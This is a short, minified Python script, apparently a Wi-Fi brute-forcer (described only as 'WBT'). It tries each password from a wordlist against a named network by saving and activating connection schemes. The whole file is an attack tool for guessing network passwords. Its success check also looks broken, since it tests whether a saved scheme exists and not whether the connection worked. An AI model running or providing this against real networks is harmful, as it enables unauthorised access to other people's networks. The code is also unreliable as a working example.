
import argparse as a,wifi as w,time as t
def c(s,p,i='wlan0'):
 x=None
 try:
  y=w.Cell.all(i)
  x=next((c for c in y if c.ssid==s),None)
 except Exception as e:
  print(f"[-] E: {e}")
  return False
 if not x:
  print(f"[-] S '{s}' nf.")
  return False
 print(f"[*] P: {p}")
 try:
  z=w.Scheme.for_cell(i,x.ssid,x,p)
  z.save()
  z.activate()
  t.sleep(5)
  if w.Scheme.find(i,x.ssid):
   print(f"[+] F: {p}")
   return True
 except Exception as e:
  return False
 return False
def b(s,f,i='wlan0'):
 try:
  with open(f,'r',encoding='utf-8',errors='ignore')as h:
   for l in h:
    p=l.strip()
    if not p:continue
    if c(s,p,i):return p
 except FileNotFoundError:
  print(f"[-] f nf: {f}")
 return None
if __name__=="__main__":
 q=a.ArgumentParser(description="WBT")
 q.add_argument("ssid",help="S")
 q.add_argument("wordlist",help="W")
 q.add_argument("-i","--interface",default="wlan0",help="I")
 r=q.parse_args()
 o=b(r.ssid,r.wordlist,r.interface)
 if not o:print("[-] P nf.")
